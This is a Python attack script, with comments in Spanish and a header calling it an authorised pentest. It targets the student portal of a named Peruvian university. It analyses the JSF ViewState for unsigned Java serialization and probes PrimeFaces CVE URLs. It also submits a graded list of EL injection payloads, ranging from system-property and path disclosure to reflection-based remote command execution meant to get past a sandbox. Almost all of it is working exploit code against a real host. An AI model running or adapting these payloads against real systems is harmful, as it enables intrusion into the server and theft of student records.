#!/usr/bin/env python3
"""
JSF ViewState + EL Injection Attack
=====================================
Pentest autorizado UNS - registro.uns.edu.pe/WebAlumno
Vectores:
  1. ViewState deserializacion (si no tiene HMAC/cifrado)
  2. EL Injection en campos JSF (#{...} expressions)
"""
import os, sys
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import requests, urllib3, re, time, base64, zlib, json
urllib3.disable_warnings()

TARGET = "https://registro.uns.edu.pe:80"
LOGIN_PATH = "/WebAlumno/faces/pages/login.xhtml"
EXP_PATH = "/WebAlumno/faces/pages/expedientePersonal.xhtml"

SESSION = requests.Session()
SESSION.verify = False
SESSION.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})


def log(msg, level="INFO"):
    icons = {"INFO": "[*]", "FOUND": "[+]", "VULN": "[!!!]", "FAIL": "[-]", "WARN": "[?]"}
    print(f"  {icons.get(level,'[*]')} {msg}", flush=True)


# ═══════════════════════════════════════════════════════════
# FASE 1: Obtener ViewState y estructura del form
# ═══════════════════════════════════════════════════════════
def get_form_data(url):
    log(f"Obteniendo formulario de: {url}")
    r = SESSION.get(f"{TARGET}{url}", timeout=15, allow_redirects=True)
    log(f"HTTP {r.status_code} | {len(r.content)} bytes | URL: {r.url}")

    # Extraer ViewState
    vs_match = re.search(r'id="javax\.faces\.ViewState"[^>]*value="([^"]+)"', r.text)
    if not vs_match:
        vs_match = re.search(r'javax\.faces\.ViewState["\s]+value="([^"]+)"', r.text)
    if not vs_match:
        vs_match = re.search(r'ViewState[^"]*"([^"]{10,})"', r.text)

    viewstate = vs_match.group(1) if vs_match else None
    log(f"ViewState: {viewstate[:60] if viewstate else 'NO ENCONTRADO'}...", "FOUND" if viewstate else "WARN")

    # Extraer todos los inputs
    inputs = re.findall(r'<input[^>]+>', r.text, re.I)
    form_fields = {}
    for inp in inputs:
        name_m = re.search(r'name="([^"]+)"', inp)
        value_m = re.search(r'value="([^"]*)"', inp)
        type_m = re.search(r'type="([^"]+)"', inp)
        if name_m:
            name = name_m.group(1)
            value = value_m.group(1) if value_m else ""
            itype = type_m.group(1) if type_m else "text"
            form_fields[name] = {"value": value, "type": itype}

    log(f"Campos encontrados: {list(form_fields.keys())}")

    # Extraer form action
    action_m = re.search(r'<form[^>]+action="([^"]+)"', r.text, re.I)
    action = action_m.group(1) if action_m else url
    log(f"Form action: {action}")

    # Extraer clientId (JSF)
    client_id_m = re.search(r'id="(frm\w+)"', r.text)
    client_id = client_id_m.group(1) if client_id_m else "frmLogueo"
    log(f"Client ID: {client_id}")

    return viewstate, form_fields, action, r.cookies, r.text


# ═══════════════════════════════════════════════════════════
# FASE 2: Analizar ViewState
# ═══════════════════════════════════════════════════════════
def analyze_viewstate(viewstate):
    print()
    print("="*60)
    print("  ANALISIS DE VIEWSTATE JSF")
    print("="*60)

    if not viewstate:
        log("No hay ViewState para analizar", "WARN")
        return False

    log(f"ViewState raw ({len(viewstate)} chars): {viewstate[:80]}...")

    # Intentar decodificar base64
    try:
        # Limpiar URL encoding
        vs_clean = viewstate.replace("%3A", ":").replace("%2F", "/").replace("%2B", "+").replace("%3D", "=")

        # Probar base64 directo
        decoded = base64.b64decode(vs_clean + "==")
        log(f"Base64 decodificado ({len(decoded)} bytes)")
        log(f"Primeros bytes hex: {decoded[:16].hex()}")

        # Verificar si es comprimido (zlib/gzip)
        if decoded[:2] == b'\x78\x9c' or decoded[:2] == b'\x78\x01' or decoded[:2] == b'\x78\xda':
            decompressed = zlib.decompress(decoded)
            log(f"COMPRIMIDO con zlib -> {len(decompressed)} bytes descomprimidos", "FOUND")
            log(f"Preview: {decompressed[:100]}", "FOUND")

            # Buscar si contiene datos Java serializados (magic bytes AC ED)
            if b'\xac\xed' in decompressed:
                log("JAVA SERIALIZATION MAGIC BYTES detectados! ViewState sin cifrar!", "VULN")
                return True
            elif b'{' in decompressed[:50]:
                log("Parece JSON: " + decompressed[:100].decode('utf-8', errors='replace'), "FOUND")
            else:
                log(f"Contenido: {decompressed[:200]}", "FOUND")

        # Verificar Java serialization directamente
        elif decoded[:2] == b'\xac\xed':
            log("JAVA SERIALIZATION detectada DIRECTAMENTE! Sin compresion!", "VULN")
            log(f"Stream version: {decoded[2:4].hex()}", "FOUND")
            return True

        # Verificar si es server-side (numero entero = stateful)
        elif decoded.decode('utf-8', errors='replace').strip().lstrip('-').isdigit():
            log(f"ViewState STATEFUL (server-side): {decoded.decode()}", "WARN")
            log("No es vulnerable a deserializacion (estado en servidor)", "FAIL")
            return False

        else:
            log(f"Formato desconocido. Hex: {decoded[:32].hex()}", "WARN")

    except Exception as e:
        log(f"Error decodificando base64: {e}", "WARN")

        # Puede ser un numero (server-side stateful)
        if viewstate.lstrip('-').isdigit():
            log(f"ViewState STATEFUL numerico: {viewstate}", "WARN")
            log("Estado guardado en servidor - no vulnerable a deserializacion cliente", "FAIL")
            return False

    # Verificar si tiene HMAC (PrimeFaces 6.0+)
    if ":" in viewstate and len(viewstate.split(":")) == 2:
        data_part, hmac_part = viewstate.split(":", 1)
        log(f"ViewState con HMAC detectado (PrimeFaces 6+)", "WARN")
        log(f"Data: {data_part[:40]}... | HMAC: {hmac_part[:20]}...", "WARN")
        log("HMAC presente - no vulnerable a deserializacion sin conocer la clave", "FAIL")
        return False

    return False


# ═══════════════════════════════════════════════════════════
# FASE 3: EL Injection en campos JSF
# ═══════════════════════════════════════════════════════════
def test_el_injection(form_fields, action, viewstate, cookies):
    print()
    print("="*60)
    print("  EL INJECTION ATTACK (JSF Expression Language)")
    print("="*60)

    # Payloads de EL Injection - de menor a mayor impacto
    el_payloads = [
        # --- FASE 1: Deteccion basica ---
        ("#{1+1}", "2"),
        ("${1+1}", "2"),
        ("#{2*3}", "6"),

        # --- FASE 2: systemProperties (sin sandbox) ---
        ("#{systemProperties['os.name']}", None),
        ("#{systemProperties['os.arch']}", None),
        ("#{systemProperties['user.name']}", None),
        ("#{systemProperties['user.home']}", None),
        ("#{systemProperties['user.dir']}", None),
        ("#{systemProperties['java.home']}", None),
        ("#{systemProperties['java.class.path']}", None),
        ("#{systemProperties['catalina.home']}", None),
        ("#{systemProperties['jboss.home.dir']}", None),
        ("#{systemProperties['jboss.server.base.dir']}", None),
        ("#{systemProperties['jboss.server.config.dir']}", None),
        ("#{systemProperties['jboss.server.log.dir']}", None),
        ("#{systemProperties['jboss.server.deploy.dir']}", None),
        ("#{systemProperties['file.separator']}", None),

        # --- FASE 3: ServletContext / FacesContext (rutas del webroot) ---
        ("#{facesContext.externalContext.requestServletPath}", None),
        ("#{facesContext.externalContext.requestContextPath}", None),
        ("#{facesContext.externalContext.realPath('/')}", None),
        ("#{facesContext.externalContext.realPath('/WEB-INF/web.xml')}", None),
        ("#{request.servletContext.getRealPath('/')}", None),
        ("#{request.servletContext.serverInfo}", None),
        ("#{request.servletContext.contextPath}", None),
        ("#{request.serverInfo}", None),
        ("#{request.serverName}", None),
        ("#{request.localAddr}", None),   # IP interna del servidor
        ("#{request.localPort}", None),   # Puerto interno
        ("#{request.remoteAddr}", None),  # IP del proxy/LB

        # --- FASE 4: Enumeracion de aplicaciones desplegadas ---
        ("#{applicationScope}", None),
        ("#{sessionScope}", None),
        ("#{initParam}", None),

        # --- FASE 5: RCE intent (bloqueado por sandbox en PF13) ---
        ("#{runtime.exec('id')}", None),
        ('#{T(java.lang.Runtime).getRuntime().exec("id")}', None),
        # Bypass via reflection encadenada:
        ("#{facesContext.class.forName('java.lang.Runtime').getMethod('exec',facesContext.class.forName('java.lang.String')).invoke(facesContext.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}", None),
    ]

    results = []

    # Identificar campos de texto para inyectar
    text_fields = [k for k, v in form_fields.items()
                   if v.get("type", "text") in ["text", "password", "hidden", ""]
                   and "ViewState" not in k and "RENDER" not in k]

    log(f"Campos objetivo para EL injection: {text_fields}")

    for payload, expected in el_payloads:
        for field in text_fields[:3]:  # Probar en los primeros 3 campos
            try:
                # Construir POST data con el payload
                post_data = {}
                for k, v in form_fields.items():
                    post_data[k] = v.get("value", "")

                # Soporte Jakarta EE (jakarta.faces.*) y legacy (javax.faces.*)
                if "jakarta.faces.ViewState" in form_fields:
                    post_data["jakarta.faces.ViewState"] = viewstate or ""
                else:
                    post_data["javax.faces.ViewState"] = viewstate or ""
                post_data[field] = payload

                # Identificar el boton de submit
                submit_field = next((k for k in form_fields if "submit" in k.lower()
                                    or "btn" in k.lower() or "login" in k.lower()
                                    or "logueo" in k.lower() or "acceder" in k.lower()), None)
                if submit_field:
                    post_data[submit_field] = "Ingresar"

                # Agregar partial ajax si es JSF
                post_data["javax.faces.partial.ajax"] = "true"
                post_data["javax.faces.behavior.event"] = "action"
                post_data["javax.faces.partial.execute"] = "@all"
                post_data["javax.faces.partial.render"] = "@all"

                r = SESSION.post(
                    f"{TARGET}{action}",
                    data=post_data,
                    cookies=cookies,
                    timeout=12,
                    allow_redirects=True
                )

                # Verificar si el payload fue evaluado
                payload_safe = payload[:30]
                response_text = r.text

                # Buscar el expected value en la respuesta
                if expected and expected in response_text:
                    log(f"EL INJECTION EXITOSA! payload='{payload_safe}' -> '{expected}' en respuesta!", "VULN")
                    results.append(("VULN", field, payload, expected))
                elif "os.name" in payload.lower() and any(
                    os_name in response_text for os_name in ["Linux", "Windows", "Unix"]
                ):
                    os_found = next(o for o in ["Linux", "Windows", "Unix"] if o in response_text)
                    log(f"EL INJECTION! OS: {os_found}", "VULN")
                    results.append(("VULN", field, payload, os_found))
                elif "java.version" in payload.lower() and re.search(r'\d+\.\d+\.\d+', response_text):
                    ver = re.search(r'\d+\.\d+\.\d+', response_text).group(0)
                    log(f"EL INJECTION! Java version: {ver}", "VULN")
                    results.append(("VULN", field, payload, ver))
                elif any(err in response_text for err in ["ELException", "PropertyNotFoundException",
                                                            "Expression", "javax.el"]):
                    # Error de EL = el parser si procesa la expresion
                    log(f"EL PARSER ERROR detectado con '{payload_safe}' en campo '{field}'", "WARN")
                    results.append(("WARN", field, payload, "EL parser error"))
                elif payload in response_text:
                    # El payload se refleja sin evaluar - XSS potential
                    log(f"Payload REFLEJADO sin evaluar (XSS?) en campo '{field}'", "WARN")
                    results.append(("WARN", field, payload, "Reflected"))
                else:
                    log(f"'{payload_safe}' en '{field}' -> No evaluado/reflejado", "FAIL")

                time.sleep(0.3)
                break  # Un campo por payload es suficiente para detection

            except Exception as e:
                log(f"Error con payload '{payload[:20]}': {e}", "WARN")

    return results


# ═══════════════════════════════════════════════════════════
# FASE 4: PrimeFaces CVE check
# ═══════════════════════════════════════════════════════════
def check_primefaces_cves(page_source):
    print()
    print("="*60)
    print("  PRIMEFACES CVE FINGERPRINT")
    print("="*60)

    # Extraer version de PrimeFaces de los recursos
    version_patterns = [
        r'primefaces[/-](\d+\.\d+(?:\.\d+)?)',
        r'PrimeFaces[^"]*v(\d+\.\d+(?:\.\d+)?)',
        r'/javax\.faces\.resource/[^.]+\.js\.xhtml\?ln=primefaces&v=(\d+\.\d+(?:\.\d+)?)',
        r'primefaces.*?v=(\d+\.\d+(?:\.\d+)?)',
    ]

    pf_version = None
    for pat in version_patterns:
        m = re.search(pat, page_source, re.I)
        if m:
            pf_version = m.group(1)
            log(f"PrimeFaces version detectada: {pf_version}", "FOUND")
            break

    if not pf_version:
        log("Version PrimeFaces no detectada directamente", "WARN")
        # Buscar en URLs de recursos
        resource_urls = re.findall(r'/javax\.faces\.resource/([^"\']+)', page_source)
        if resource_urls:
            log(f"JSF Resources: {resource_urls[:5]}", "INFO")

    # CVEs conocidos por version de PrimeFaces
    primefaces_cves = {
        "3.x": ["CVE-2013-3827 (EL Injection sin auth)", "CVE-2014-3531 (XSS)"],
        "4.x": ["CVE-2014-7490 (EL Injection)", "CVE-2016-9878 (Path Traversal en /javax.faces.resource/)"],
        "5.x": ["CVE-2016-9878 (Path Traversal)", "CVE-2017-1000486 (EL Injection via viewId)"],
        "6.x": ["CVE-2020-21485 (XSS)", "CVE-2018-1000867 (XSS en widget var)"],
        "8.x": ["CVE-2021-44228 (Log4Shell si usa Log4j)", "CVE-2023-24816 (XSS)"],
        "10.x": ["CVE-2023-24816 (XSS)"],
        "11.x": ["CVE-2024-43009 (XSS en p:editor)"],
    }

    # CVE mas critico: CVE-2017-1000486 - EL Injection via /faces/javax.faces.resource/
    log("Probando CVE-2017-1000486 (EL Injection via resource URL)...", "INFO")
    # Este CVE permite EL injection en el parametro pfdrt/ln de recursos JSF
    test_urls = [
        '/WebAlumno/javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&ln=primefaces&pfdlid=0&v=#{1+1}',
        '/WebAlumno/faces/javax.faces.resource.xhtml?ln=primefaces&library=#{request.serverInfo}',
        '/WebAlumno/javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&ln=primefaces&pfdlid=#{1+2}',
    ]

    for url in test_urls:
        try:
            r = SESSION.get(f"https://registro.uns.edu.pe:80{url}", timeout=8, allow_redirects=True)
            log(f"HTTP {r.status_code} | {url[:60]}", "INFO")
            if r.status_code == 200 and len(r.content) > 0:
                if "3" in r.text[:10] or "2" in r.text[:10]:
                    log(f"POSIBLE EL Injection! Respuesta: {r.text[:50]}", "VULN")
                elif r.content[:4] == b'\x89PNG' or r.content[:2] == b'\xff\xd8':
                    log("Recurso estatico (imagen)", "FAIL")
                else:
                    log(f"Respuesta: {r.text[:80]}", "INFO")
        except Exception as e:
            log(f"Error: {e}", "WARN")
        time.sleep(0.2)

    return pf_version


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
def main():
    print("="*60)
    print("  JSF ViewState + EL Injection Attack")
    print("  Target: registro.uns.edu.pe/WebAlumno")
    print("="*60)

    # Obtener formulario de login
    viewstate, form_fields, action, cookies, page_source = get_form_data(LOGIN_PATH)

    if not viewstate:
        log("Intentando desde expedientePersonal...", "WARN")
        viewstate, form_fields, action, cookies, page_source = get_form_data(EXP_PATH)

    # ViewState analysis
    is_vuln_vs = analyze_viewstate(viewstate)

    # PrimeFaces CVE check
    pf_version = check_primefaces_cves(page_source)

    # EL Injection
    if form_fields:
        el_results = test_el_injection(form_fields, action, viewstate, cookies)
    else:
        log("No se encontraron campos de formulario para EL injection", "WARN")
        el_results = []

    # Resumen
    print()
    print("="*60)
    print("  RESUMEN")
    print("="*60)

    vulns = [r for r in el_results if r[0] == "VULN"]
    warns = [r for r in el_results if r[0] == "WARN"]

    if is_vuln_vs:
        log("ViewState DESERIALIZABLE - RCE posible con ysoserial!", "VULN")
    else:
        log("ViewState: Protegido (server-side o HMAC)", "FAIL")

    if vulns:
        log(f"EL INJECTION CONFIRMADA en {len(vulns)} caso(s)!", "VULN")
        for _, field, payload, result in vulns:
            log(f"  Campo: {field} | Payload: {payload[:40]} | Resultado: {result}", "VULN")
    elif warns:
        log(f"Comportamiento anomalo EL: {len(warns)} advertencias", "WARN")
        for _, field, payload, result in warns:
            log(f"  Campo: {field} | {result}", "WARN")
    else:
        log("No se confirmo EL Injection en campos de formulario", "FAIL")

    # Guardar
    out = r"c:\Users\Leguion T\Desktop\plan te pent\findings\jsf_el_injection_results.txt"
    with open(out, "w", encoding="utf-8") as f:
        f.write("JSF ViewState + EL Injection Results\n")
        f.write(f"Target: {TARGET}\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"ViewState vulnerable: {is_vuln_vs}\n")
        f.write(f"PrimeFaces version: {pf_version}\n")
        f.write(f"ViewState value: {viewstate}\n\n")
        f.write(f"Form fields: {list(form_fields.keys())}\n\n")
        for level, field, payload, result in el_results:
            f.write(f"[{level}] {field}: {payload} -> {result}\n")
    log(f"Resultados guardados: {out}")


if __name__ == "__main__":
    main()
